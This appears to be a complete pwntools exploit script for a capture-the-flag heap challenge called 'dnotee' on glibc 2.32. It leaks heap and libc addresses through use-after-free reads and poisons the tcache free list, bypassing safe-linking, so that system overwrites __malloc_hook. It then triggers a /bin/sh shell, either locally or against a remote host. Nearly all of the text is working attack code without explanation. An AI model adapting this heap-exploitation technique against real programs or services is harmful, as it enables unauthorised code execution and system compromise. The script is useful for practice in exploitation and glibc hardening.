#!/usr/bin/env python3
from pwn import *

exe = ELF("dnotee")
libc = ELF("libc.so")
ld = ELF("ld-2.32.so")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("addr", 1337)
else:
    p = process([exe.path])
    gdb.attach(p, """"

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def add(idx,size,name):
    sla(b">>",b"1")
    sla(b":",str(idx).encode())
    sla(b":",str(size).encode())
    sla(b":",name)
def delete(idx):
    sla(b">>",b"3")
    sla(b":",str(idx).encode())
def show(idx):
    sla(b">>",b"2")
    sla(b":",str(idx).encode())
pop_rdi = 0x000000000040156b
log.info(f"allocate 7 chunks and then 2 more")
for i in range(9):
    print(i)
    add(i,0x100,b"lmaodark")
add(9,0x10,b"no consolidation")
for i in range(7):
    delete(i)
delete(8)
delete(7)
for i in range(9):
    print(b"leak.............................")
    show(i)
    a = p.recvline()
    log.info(f"leak {i}: {a}")
log.info(f"pop from tcache")
show(6)
p.recvuntil(b" ")
heap = u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\x00"))
log.info(f"heap: {hex(heap)}")
heap_base = heap - 0x3f5
write = heap_base +0xb20
log.info(f"heap base: {hex(heap_base)}")
log.info(f"write: {hex(write)}")
show(8)
p.recvuntil(b" ")
leakaddr = u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\x00"))
log.info(f"leak thing: {hex(leakaddr)}")
libc.address = leakaddr - 0x1bebe0
bin_sh = libc.search(b"/bin/sh").__next__()
log.info(f"bin_sh: {hex(bin_sh)}")
add(0,0x100,b"pop from tcache")
delete(8)
# overwrite fd
xorthing = libc.sym['__malloc_hook']^write>>12
add(8,0x210,b"a"*232+b"a"*0x20+p64(0x111)+p64(xorthing)+b"a"*8)
log.info(f"malloc hook: {hex(libc.sym['__malloc_hook'])}")
add(5,0x110-0x16,b"/bin/sh\0")
add(5,0x110-0x16,p64(libc.sym["system"]))
# run bin sh
bin_sh = heap_base+0xb20
add(5,bin_sh,b"\n")




p.interactive()
# good luck pwning :)

